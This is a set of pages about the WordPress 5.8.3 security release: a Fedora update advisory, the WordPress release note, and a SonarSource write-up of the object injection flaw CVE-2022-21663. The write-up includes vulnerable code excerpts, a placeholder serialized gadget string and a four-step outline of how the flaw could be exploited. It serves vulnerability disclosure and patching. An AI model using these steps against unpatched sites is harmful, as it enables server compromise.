* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-DM6XPH3JN6V4NF4WBOJTOXZIVE6VKKE3.mbox.gz?message=DM6XPH3JN6V4NF4WBOJTOXZIVE6VKKE3 "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/DM6XPH3JN6V4NF4WBOJTOXZIVE6VKKE3/#DM6XPH3JN6V4NF4WBOJTOXZIVE6VKKE3)

# [SECURITY] Fedora 35 Update: wordpress-5.8.3-1.fc35

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

16 Jan
2022

16 Jan
'22

1:19 a.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2022-8472dd59ff
2022-01-16 01:17:23.607683
--------------------------------------------------------------------------------

Name : wordpress
Product : Fedora 35
Version : 5.8.3
Release : 1.fc35
URL : <http://www.wordpress.org>
Summary : Blog tool and publishing platform
Description :
Wordpress is an online publishing / weblog package that makes it very easy,
almost trivial, to get information out to people on the web.

Important information in /usr/share/doc/wordpress/README.fedora

--------------------------------------------------------------------------------
Update Information:

\*\*Security Updates\*\* Four security issues affect WordPress versions between 3.7
and 5.8. If you haven���t yet updated to 5.8, all WordPress versions since 3.7
have also been updated to fix the following security issue (except where noted
otherwise): \* Props to Karim El Ouerghemmi and Simon Scannell of SonarSource
for disclosing an issue with stored XSS through post slugs. \* Props to Simon
Scannell of SonarSource for reporting an issue with Object injection in some
multisite installations. \* Props to ngocnb and khuyenn from GiaoHangTietKiem
JSC for working with Trend Micro Zero Day Initiative on reporting a SQL
injection vulnerability in WP\_Query. \* Props to Ben Bidner from the WordPress
security team for reporting a SQL injection vulnerability in WP\_Meta\_Query (only
relevant to versions 4.1-5.8).
--------------------------------------------------------------------------------
ChangeLog:

\* Fri Jan 7 2022 Remi Collet remi@remirepo.net - 5.8.3-1
- WordPress 5.8.3 Security Release
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2039301 - CVE-2022-21661 wordpress: SQL injection via WP\_Query
<https://bugzilla.redhat.com/show_bug.cgi?id=2039301>
[ 2 ] Bug #2039306 - CVE-2022-21662 wordpress: stored XSS through authenticated users
<https://bugzilla.redhat.com/show_bug.cgi?id=2039306>
[ 3 ] Bug #2039312 - CVE-2022-21663 wordpress: authenticated object injection in multisites
<https://bugzilla.redhat.com/show_bug.cgi?id=2039312>
[ 4 ] Bug #2039317 - CVE-2022-21664 wordpress: SQL injection due to improper sanitization in WP\_Meta\_Query
<https://bugzilla.redhat.com/show_bug.cgi?id=2039317>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2022-8472dd59ff' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/DM6XPH3JN6V4NF4WBOJTOXZIVE6VKKE3/#DM6XPH3JN6V4NF4WBOJTOXZIVE6VKKE3)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from blog.sonarsource.com_28dfb4ab_20250108_124123.html ===
NEW![Sonar has entered a definitive agreement to acquire Tidelift! Read the press release.](/company/press-releases/sonar-to-acquire-tidelift/) [![](data:image/svg+xml;charset=utf-8...)![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=128&h=32&auto=format&fit=clip)![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=128&h=32&auto=format&fit=clip)](/ "Home")

* Solutions

  Use Cases

  [AI-assisted & quality-assured codeEnsure code generated by AI assistants is of the highest quality](/solutions/ai/)[DevOps transformationHarness the full potential of DevOps by reducing roll backs and improving quality of releases](/solutions/devops-transformation/)[Code coverageEnsure code quality and security by facilitating faster debugging through clear visibility of coverage gaps.](/solutions/code-coverage/) [Reduce & manage technical debtMaximize innovation by proactively managing technical debt](/solutions/reduce-technical-debt/)[Secure by designIntegrate code security in compliance with NIST Secure Software Development Framework](/solutions/secure-by-design-code/)[All Use CasesRead more about Sonar Use cases with blog articles, technical articles and developer guides](/solutions/use-cases/)

  Clean Code

  [What is clean codeA detailed definition of Clean Code](/solutions/clean-code/)[Power of clean codeBusiness success built on Clean Code](/solutions/power-of-clean-code/)[Security starts with Clean CodeStatic Application Security Testing with Sonar](/solutions/security/)[Clean as You CodeOur unique approach to Clean Code](/solutions/our-unique-approach/)

  Something For Everyone

  [For DevelopersFind and fix issues as you code](/solutions/for-developers/)[For DevOpsBuild your apps on Clean Code foundations](/solutions/infrastructure-as-code/)[For EnterpriseClean Code delivery from development to production](/solutions/for-enterprise/)[For the Public SectorClean Code for the public sector](/solutions/public-sector/)
* Products

  Industry Leading Products

  [![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/aa3b1f02-f1b0-448f-a3f2-a1bd32923a08/SQ_Logo_Cloud_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarCloudCloud-based static analysis tool for your CI/CD workflows](/products/sonarcloud/)[![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/bdac1871-464e-4051-88db-7df20c3bfffa/SQ_Logo_Server_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarQubeSelf-managed static analysis tool for continuous codebase inspection](/products/sonarqube/)[![]()![](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/49f23af2-a29b-4d0f-95d7-ffd361f375e1/SQ_Logo_IDE_Light%20Backgrounds.svg?w=176&h=48&auto=format&fit=crop)Formerly SonarLintFree IDE extension that provides on-the-fly analysis and coding guidance](/products/sonarlint/)

  Languages and Frameworks

  [Java](/knowledge/languages/java/)[JavaScript](/knowledge/languages/js/)[TypeScript](/knowledge/languages/ts/)[Python](/knowledge/languages/python/)[C#](/knowledge/languages/csharp/)[C++](/knowledge/languages/cpp/)[C](/knowledge/languages/c/)[PHP](/knowledge/languages/php/)[Kotlin](/knowledge/languages/kotlin/)[See All](/lp/knowledge/languages/)
* Resources

  Learn About Clean Code

  [BlogStay connected with our latest development news and articles](/blog/)[Events hubLet's meet up online or in person - browse our conferences and webinars, or watch previous talks](/resources/events/)[Customer StoriesCheck out Sonar implementation success stories](/resources/customer-stories/)[White PapersFind in-depth articles on clean code](/resources/white-papers/)[LearnDeveloper learning hub - covering essential topics](/learn/)[Solution BriefsOur library of solution briefs](/resources/solution-briefs/)

  Go In Depth

  [SonarQube Server DocumentationFind more information on the technical details of SonarQube Server](https://docs.sonarsource.com/sonarqube/latest/)[SonarQube Cloud DocumentationFind more information on the technical details of SonarQube Cloud](https://docs.sonarsource.com/sonarcloud/)[SonarQube for IDE DocumentationFind more information on the technical details of SonarQube IDE](https://docs.sonarsource.com/sonarlint/)[Explore SonarpediaExplore our publicly available multi-language rules database](https://rules.sonarsource.com/)[LanguagesSee our multi-language coverage](/knowledge/languages/)
* Company

  Deliver Better Software

  [About UsSonar’s industry leading solution enables developers to write clean code and remediate existing code organically](/company/about/)[CareersJoin our growing team](/company/careers/)[Commitment to open sourceOur commitment to transparency, security, and continuous improvement](/solutions/commitment-to-open-source/)[CommunityGet latest updates, suggest features, and share your knowledge](https://community.sonarsource.com/)[PartnersSonar partners with the best resellers to bring Clean Code closer to you](/company/partners/)[Contact usHave questions? Get in touch](/company/contact/)

  Media

  [NewsroomNews announcements, media coverage, and more](/company/newsroom/)[CoverageFind articles about Sonar in the news](/company/coverage/)[Press ReleasesThe latest Sonar updates](/company/press-releases/)[CustomersAn overview of customers using Sonar by industry](/company/customers/)[Press KitExecutive headshots, quick stats, customer logos, and more](/company/press-kit/)
[Start for free](/open-source-editions/)[Explore pricing](/plans-and-pricing/)
Search modal toggle button[Start for free](/open-source-editions/)[Explore pricing](/plans-and-pricing/)Mobile menu toggle button

Blog post

# WordPress < 5.8.3 - Object Injection Vulnerability

![](data:image/svg+xml;charset=utf-8...)![Simon Scannell photo]()![Simon Scannell photo](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/39a5ba27-50e6-46a9-915d-4c21a2205308/05747622-11af-457d-a883-8ad3b3fb7aaf_simon.jpg?w=1080&h=1080&auto=format&fit=crop)

Simon Scannell

Vulnerability Researcher

February 8, 2022

Date

* [Security](/blog/tag/security/)
![](data:image/svg+xml;charset=utf-8...)![We discovered an interesting code vulnerability that could be used to bypass hardening mechanisms in the popular WordPress CMS.](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/db08c2ae-ef53-4e19-b0d0-6937acb5b23d/cover-73a1a08a-f7a1-4e3c-a3ec-86d7a16fdde3_RD-108%25402x.png?w=2400&h=1256&auto=format&fit=crop)![We discovered an interesting code vulnerability that could be used to bypass hardening mechanisms in the popular WordPress CMS.](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/db08c2ae-ef53-4e19-b0d0-6937acb5b23d/cover-73a1a08a-f7a1-4e3c-a3ec-86d7a16fdde3_RD-108%25402x.png?w=2400&h=1256&auto=format&fit=crop)

At the time of writing, WordPress powers 43% of websites on the Internet. Its simplicity and robustness enable millions of users to host their blog, eCommerce site, forum, or static website. To protect its users, several security hardening mechanisms were introduced to the code base in the past.

We discovered an interesting Object Injection vulnerability (CVE-2022-21663) in the WordPress core that was recently fixed with version [5.8.3](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/ "5.8.3"). Object Injection is a code vulnerability that enables attackers to inject PHP objects of arbitrary types into the application which can then tamper with the application’s logic at runtime. If you are new to the subject, we recommend reading our [PHP Object Injection blog post](https://blog.sonarsource.com/php-object-injection "PHP Object Injection blog post").

Although this particular vulnerability is hard to exploit, it demonstrates that these types of severe vulnerabilities are still found in complex and hardened code-bases. In this blog post, we examine the vulnerable code lines and uncover an interesting attack surface in the WordPress core.

## Impact

The Object injection vulnerability can be triggered on multi-site WordPress installations by a malicious super-admin. Such privileges could be gained by exploiting a Cross-Site-Scripting vulnerability in the core or in any of the plugins installed on a targeted WordPress instance.

A WordPress instance usually ships with multiple plugins out of the 60.000 plugins that are freely available. It is common for a business website to have 20-30 active plugins. We have [demonstrated in the past](https://blog.sonarsource.com/wordpress-csrf-to-rce "demonstrated in the past") how all an attacker needs is a simple Cross-Site Scripting vulnerability in just one of the plugins installed to take over the targeted WordPress instance. This is due to the fact that on instances with default configurations, an admin can install malicious plugins and even edit their PHP code from within the admin panel.

To prevent attackers from abusing these features, WordPress released an [official hardening guide](https://wordpress.org/support/article/hardening-wordpress/ "official hardening guide"), which enables administrators to disable the aforementioned, dangerous features. When they are disabled and an attacker manages to hijack an administrative session, for example with a Stored XSS vulnerability in the core (see [our last blog post](https://blog.sonarsource.com/wordpress-stored-xss-vulnerability "our last blog post")), the attacker finds themselves in a “sandbox”. This means they are an administrator on the targeted instance, but they can’t execute PHP code on the underlying server. When a plugin is installed that contains appropriate pop-chain gadgets, this Object Injection vulnerability in WordPress could lead to Remote Code Execution.

## Technical Details

In this section, we break down the technical details of this Object Injection vulnerability and how it might be exploited.

### Background - WordPress options

A WordPress site is controlled by hundreds of different [options](https://developer.wordpress.org/plugins/settings/options-api/ "options"). These options are used to configure a WordPress site. In the underlying code, options are fetched from the database with help of the `get_option($key)` function and updated with help of the `update_option($key, $value)` function. Over time, the list of options stored on a WordPress site usually grows as WordPress plugin developers and even core developers tend to store internal data, which is not meant to be modified by a user or even administrator, as option pairs.

However, as an administrator of a WordPress site, it is possible to list and modify almost all option key/value pairs stored in the database. The following screenshot shows a list of options obtained by visiting the page at */wp-admin/options.php* on a test instance:

![](data:image/svg+xml;charset=utf-8...)![options page]()![options page](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/88348ce7-f46b-4d79-a402-0c8d994a524e/body-a3fea17c-6faf-46bb-9aa7-c5a96f182fdf_admin-options.png?w=776&h=288&auto=format&fit=crop)

Some of the option names in the screenshot above suggest that the data associated with them is meant for internal processes and should not be modified by an administrator. For instance,  the value of the `active_plugins` option: in the screenshot, it is displayed as a grayed-out field with the value `SERIALIZED_DATA`.

As [documented](https://developer.wordpress.org/reference/functions/update_option/ "documented") in the WordPress developer reference, the `update_option($key, $value)` function can take objects, arrays, integers, strings, and other types as a value as long as they can be serialized. In such a case, a PHP serialized string is stored in the database.

The WordPress core ensures that no deserialization attacks can be performed by checking if a string has previously been serialized and if so, double-serializing it. This is done by the `maybe_serialize($data)` function:

**wordpress/wp-includes/functions.php**

```
597  function maybe_serialize( $data ) {
 598         if ( is_array( $data ) || is_object( $data ) ) {
 599                 return serialize( $data );
 600         }
 601
 602         /*
 603          * Double serialization is required for backward compatibility.
 604          * See https://core.trac.wordpress.org/ticket/12930
 605          * Also the world will end. See WP 3.6.1.
 606          */
 607         if ( is_serialized( $data, false ) ) {
 608                 return serialize( $data );
 609         }
 610
 611         return $data;
```

The symmetrical twin of the `maybe_serialize($data)` function is the `maybe_unserialize($data)` function:

**wordpress/wp-includes/functions.php**

```
wordpress/wp-includes/functions.php
 622 function maybe_unserialize( $data ) {
 623         if ( is_serialized( $data ) ) {
 624                 return @unserialize( trim( $data ) );
 625         }
 626
 627         return $data;
 628 }
```

Notice how both functions utilize `is_serialized($data)` to detect whether a string looks like a PHP serialized string. The next section goes into detail about an Object Injection vulnerability that occured because this function was used incorrectly in the WordPress core.

### Object Injection (CVE-2022-21663)

Every time WordPress handles an incoming request, it executes a list of validation steps. One of these steps is to ensure that the version of the database associated with the WordPress installation matches the version of the current code files.

For each new WordPress version that is released, the latest database version is updated in a global variable:

**wordpress/wp-includes/version.php**

```
 18 /**
 19  * Holds the WordPress DB revision, increments when changes are made to the WordPress DB schema.
 20  *
 21  * @global int $wp_db_version
 22  */
 23 $wp_db_version = 49752;
```

The version shown in the snippet above is the version that the database **should** be in when it has been fully upgraded. The version of the database as it is at the time of the request is stored as a WordPress option. The following snippet shows how this option is fetched from the database. When it is equal to the version that it is supposed to be, no action is performed and the request is handled. If the version is out of sync, a set of upgrade scripts are run, as shown below:

```
wordpress/wp-admin/includes/upgrade.php
 636 function wp_upgrade() {
 637   global $wp_current_db_version, $wp_db_version, $wpdb;
 638
 639   $wp_current_db_version = __get_option( 'db_version' );
 640
 641   // We are up to date. Nothing to do.
 642   if ( $wp_db_version == $wp_current_db_version ) {
 643       return;
 644   }
 645
 646   if ( ! is_blog_installed() ) {
 647       return;
 648   }
 649
	  // …
 654   upgrade_all();
 754 	  // …
 755   if ( $wp_current_db_version < 8989 ) {
 756       upgrade_270();
 757   }
 758
 759   if ( $wp_current_db_version < 10360 ) {
 760       upgrade_280();
 761   }
 762   // …
```

This behavior is interesting as a malicious admin can set `$wp_current_db_version` to an arbitrary value, as it is a controllable option. Thus, an attacker can run any database upgrade scripts, including those that operate on controllable data, such as option values and meta-data associated with users and posts. This ability gives an attacker access to an interesting attack surface in the WordPress core.

The executed upgrade script `upgrade_280()` is of particular interest:

**wordpress/wp-admin/includes/upgrade.php**

```
wordpress/wp-admin/includes/upgrade.php
1605 function upgrade_280() {
1606     global $wp_current_db_version, $wpdb;
1607
1608     if($wp_current_db_version < 10360 ) {
1609         populate_roles_280();
1610     }
1611     if(is_multisite() ) {
1612         $start = 0;
1613         while($rows = $wpdb->get_results( "SELECT option_name, option_value FROM $wpdb->options ORDER BY option_id LIMIT $start, 20")){
1614             foreach ( $rows as $row ) {
1615                 $value = $row->option_value;
1616                 if ( ! @unserialize( $value ) ) {
1617                     $value = stripslashes( $value );
1618                 }
```

This upgrade script fetches options from the database in line 1613 and attempts to deserialize them on line 1616. The important detail to look out for is that PHP’s built-in `unserialize()` function is used directly, and not the usual `maybe_unserialize()`. The following paragraphs will break down why this behavior is interesting and how it leads to an Object Injection vulnerability.

As discussed previously, a malicious admin can almost arbitrarily control the values of options and could thus attempt to inject a serialized PHP string into the database. One restriction is that when a serialized PHP string is detected, it is serialized again and thus becomes harmless.

As an example, if an attacker tried to set the value of an option to the following serialized string:

```
O:20:"SuperDangerousGadget":1:{s:18:"dangerous_property";s:8:"bash ...";}
```

it would be double serialized into:

```
s:73:"O:20:"SuperDangerousGadget":1:{s:18:"dangerous_property";s:8:"bash ...";}";
```

The result of this double-serialization is that the payload becomes harmless when unserialized, as it will result in a string.

As a consequence, we looked at the code that actually detects if a string is serialized in the WordPress core in hope to find a differential in the logic between the code of WordPress and the `unserialize()` code in the PHP core.

As a reminder: here are some of the types supported by PHP’s `unserialize()` function:

| **Type** | **Example of serialized string** |
| --- | --- |
| Integer | i:1337; |
| Float | d:1337; |
| String | s:15:"hack the planet"; |
| Object | O:8:"stdClass":0:{} |
| Object with custom deserialization function (available in PHP < 7.4) | C:11:"ArrayObject":21:{x:i:0;a:0:{};m:a:0:{}} |

What follows is a code excerpt from the `is_serialized($data)` function from the WordPress core. This function compares the first character of the supplied input against a list of characters that indicate this string could be a serialized PHP string and then further makes comparisons. Note how the `C` character for special objects is not taken into account in the switch cases:

**wordpress/wp-includes/functions.php**

```
677     $token = $data[0];
 678     switch ( $token ) {
 679         case 's':
 680             if ( $strict ) {
 681                 if ( '"' !== substr( $data, -2, 1 ) ) {
 682                     return false;
 683                 }
 684             } elseif ( false === strpos( $data, '"' ) ) {
 685                 return false;
 686             }
 687             // Or else fall through.
 688         case 'a':
 689         case 'O':
 690             return (bool) preg_match( "/^{$token}:[0-9]+:/s", $data );
 691         case 'b':
 692         case 'i':
 693         case 'd':
 694             $end = $strict ? '$' : '';
 695             return (bool) preg_match( "/^{$token}:[0-9.E+-]+;$end/", $data );
 696     }
 697     return false;
```

Usually, this would not be a problem. As this function misses special objects where the serialized string starts with a `C`, an attacker can inject such a serialized PHP string into the database. However, because the `maybe_unserialize()` function only passes the string to PHP’s `unserialize()` when it is recognized as a serialized string with `maybe_serialize()`, it will never be unserialized.

This symmetry between `maybe_unserialize()` and `maybe_serialize()` is broken in the previously described upgrade script. It passes the string directly to PHP’s `unserialize()` function.

As a result, an attacker can perform the following steps to exploit this vulnerability:

1. Inject a PHP serialized string of a special object carrying malicious [pop chain gadgets](https://blog.sonarsource.com/php-object-injection "pop chain gadgets") as properties into the database as an option value.
2. `maybe_serialize()` won’t recognize the payload as a serialized string and does not double serialize it.
3. Modify the database version option to trigger the vulnerable upgrade script
4. The upgrade script passes the PHP serialized string directly to `unserialize()`, which recognizes the string and deserializes it, triggering the pop chain.

### Patch

WordPress fixed this code vulnerability with a [patch commit](https://github.com/WordPress/WordPress/commit/638ef7815ec29318434365ffde1d3cef7437b948 "patch commit") which is included in WordPress version [5.8.3](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/ "5.8.3"). The vulnerability was fixed by using `maybe_unserialize($data)` in the vulnerable `upgrade_280()` function to fix the asymmetry between `maybe_serialize($data)` and `unserialize($data)`.

## Timeline

| **Date** | **Action** |
| --- | --- |
| 2019-04-17 | We report the issue to WordPress on Hackerone. |
| 2019-04-25 | Wordpress acknowledges reception of the vulnerability. |
| 2019-07-26 | WordPress triages the report. |
| 2022-01-06 | WordPress fixes the vulnerability with version 5.8.3 |

## Summary

In this blog post we analyzed an Object Injection vulnerability (CVE-2022-21663) in the WordPress core. This vulnerability was caused by an asymmetry between parsers of two functions. Differences in the way two different components of an application handle and interpret data is a common issue that often has security consequences. in this case, it lead to an Object Injection vulnerability. Other research has shown how this can [lead to SSRF issues](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf "lead to SSRF issues") and / or [Path Traversal](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf "Path Traversal") issues.

We are happy to see the vulnerability patched after almost 3 years of it being reported, and, if not already done so, strongly recommend updating your WordPress installation to the latest version [5.8.3](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/ "5.8.3").

#### SHARE

[twitter](https://twitter.com/share?text=undefined)[facebook](https://www.facebook.com/sharer/sharer.php?u=undefined)[linkedin](https://www.linkedin.com/sharing/share-offsite/?url=undefined)mail[Go to SonarSource homepage![](data:image/svg+xml;charset=utf-8...)![sonar logo ]()![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=160&h=40&auto=format&fit=crop)](/)

* **Sonar Solutions**
  + [SAST](/solutions/security/)
  + [What is clean code](/solutions/clean-code/)
  + [Power of clean code](/solutions/power-of-clean-code/)
  + [Clean as you code](/solutions/our-unique-approach/)
  + [AI-assisted & quality-assured code](/solutions/ai/)
  + [DevOps transformation](/solutions/devops-transformation/)
  + [Outsourcing software development](/solutions/reduce-outsourcing-software-development-risk/)
  + [Reduce & manage technical debt](/solutions/reduce-technical-debt/)
  + [Secure by design](/solutions/secure-by-design-code/)
  + [Code coverage](/solutions/code-coverage/)
  + [Code review](/solutions/code-review/)
  + [For developers](/solutions/for-developers/)
  + [For enterprise](/solutions/for-enterprise/)
  + [Infrastructure as code](/solutions/infrastructure-as-code/)
  + [Public sector](/solutions/public-sector/)
* **Products**
  + [SonarQube for IDE](/products/sonarlint/)
  + [SonarQube Server](/products/sonarqube/)
  + [SonarQube Cloud](/products/sonarcloud/)**Pricing**
  + [Start for free](/open-source-editions/)
  + [Explore pricing](/plans-and-pricing/)
* **Company**
  + [About](/company/about/)
  + [Careers](/company/careers/)
  + [Commitment to open source](/solutions/commitment-to-open-source/)
  + [Customers](/company/customers/)
  + [Partners](/company/partners/)
  + [Contact us](/company/contact/)
  + [Accessibility](/accessibility/)
  + [NEW! Brand identity](/brand-identity/)**Media**
  + [Coverage](/company/coverage/)
  + [Press releases](/company/press-releases/)
* **Resources**
  + [Events hub](/resources/events/)
  + [Customer stories](/resources/customer-stories/)
  + [White papers](/resources/white-papers/)
  + [Learn](/learn/guide/)
  + [Community](https://community.sonarsource.com/)
  + [Support](/support/)
* **Knowledge**
  + [Explore Sonarpedia](https://rules.sonarsource.com/)
  + [Blog](/blog/)
  + [Languages](/knowledge/languages/)
  + [SonarQube Server Documentation](https://docs.sonarsource.com/sonarqube/latest/)
  + [SonarQube Cloud Documentation](https://docs.sonarsource.com/sonarcloud/)
  + [SonarQube for IDE Documentation](https://docs.sonarsource.com/sonarlint/)

* [Legal documentation](/legal/)
* [Trust center](/trust-center/)

* [Follow SonarSource on Twitter](https://twitter.com/sonarsource)
* [Follow SonarSource on Linkedin](https://www.linkedin.com/company/sonarsource/)

© 2008-2025 SonarSource SA. All rights reserved. SONAR, SONARSOURCE, SONARQUBE, and CLEAN AS YOU CODE are trademarks of SonarSource SA.



=== Content from wordpress.org_09116f2f_20250108_124125.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[News](https://wordpress.org/news)

WordPress 5.8.3 Security Release

All posts

Search results

* Categories
  + [All Posts](https://wordpress.org/news/all-posts/)
  + [Awards](https://wordpress.org/news/category/awards/)
  + [Community](https://wordpress.org/news/category/community/)
  + [Design](https://wordpress.org/news/category/design/)
  + [Development](https://wordpress.org/news/category/development/)
  + [Documentation](https://wordpress.org/news/category/documentation/)
  + [Events](https://wordpress.org/news/category/events/)
  + [Features](https://wordpress.org/news/category/features/)
  + [General](https://wordpress.org/news/category/general/)
  + [Interviews](https://wordpress.org/news/category/interviews/)
  + [Meta](https://wordpress.org/news/category/meta/)
  + [Month in WordPress](https://wordpress.org/news/category/month-in-wordpress/)
  + [Performance](https://wordpress.org/news/category/performance/)
  + [Podcast](https://wordpress.org/news/podcast/)
  + [Releases](https://wordpress.org/news/category/releases/)
  + [Security](https://wordpress.org/news/category/security/)
  + [Store](https://wordpress.org/news/category/store/)
  + [Testing](https://wordpress.org/news/category/testing/)
  + [Updates](https://wordpress.org/news/category/updates/)
  + [WordCamp](https://wordpress.org/news/category/wordcamp/)

* Categories
  + [All Posts](https://wordpress.org/news/all-posts/)
  + [Awards](https://wordpress.org/news/category/awards/)
  + [Community](https://wordpress.org/news/category/community/)
  + [Design](https://wordpress.org/news/category/design/)
  + [Development](https://wordpress.org/news/category/development/)
  + [Documentation](https://wordpress.org/news/category/documentation/)
  + [Events](https://wordpress.org/news/category/events/)
  + [Features](https://wordpress.org/news/category/features/)
  + [General](https://wordpress.org/news/category/general/)
  + [Interviews](https://wordpress.org/news/category/interviews/)
  + [Meta](https://wordpress.org/news/category/meta/)
  + [Month in WordPress](https://wordpress.org/news/category/month-in-wordpress/)
  + [Performance](https://wordpress.org/news/category/performance/)
  + [Podcast](https://wordpress.org/news/podcast/)
  + [Releases](https://wordpress.org/news/category/releases/)
  + [Security](https://wordpress.org/news/category/security/)
  + [Store](https://wordpress.org/news/category/store/)
  + [Testing](https://wordpress.org/news/category/testing/)
  + [Updates](https://wordpress.org/news/category/updates/)
  + [WordCamp](https://wordpress.org/news/category/wordcamp/)

January 6, 2022
By [Jonathan Desrosiers](https://profiles.wordpress.org/desrosj/)
in [Releases](https://wordpress.org/news/category/releases/), [Security](https://wordpress.org/news/category/security/)
# WordPress 5.8.3 Security Release

---

This security release features four security fixes. Because this is a security release, it is recommended that you update your sites immediately. All versions since WordPress 3.7 have also been updated.

WordPress 5.8.3 is a short-cycle security release. The next major release will be version [5.9](https://make.wordpress.org/core/5-9/), which is already in the Release Candidate stage.

You can update to WordPress 5.8.3 by downloading from WordPress.org or visiting your Dashboard → Updates and clicking Update Now.

If you have sites that support automatic background updates, they’ve already started the update process.

### Security Updates

Four security issues affect WordPress versions between 3.7 and 5.8. If you haven’t yet updated to 5.8, all WordPress versions since 3.7 have also been updated to fix the following security issue (except where noted otherwise):

* Props to Karim El Ouerghemmi and Simon Scannell of [SonarSource](https://www.sonarsource.com/) for disclosing an issue with stored XSS through post slugs.
* Props to Simon Scannell of [SonarSource](https://www.sonarsource.com/) for reporting an issue with Object injection in some multisite installations.
* Props to ngocnb and khuyenn from [GiaoHangTietKiem JSC](https://giaohangtietkiem.vn/) for working with [Trend Micro Zero Day Initiative](https://www.zerodayinitiative.com/) on reporting a SQL injection vulnerability in WP\_Query.
* Props to Ben Bidner from the WordPress security team for reporting a SQL injection vulnerability in WP\_Meta\_Query (only relevant to versions 4.1-5.8).

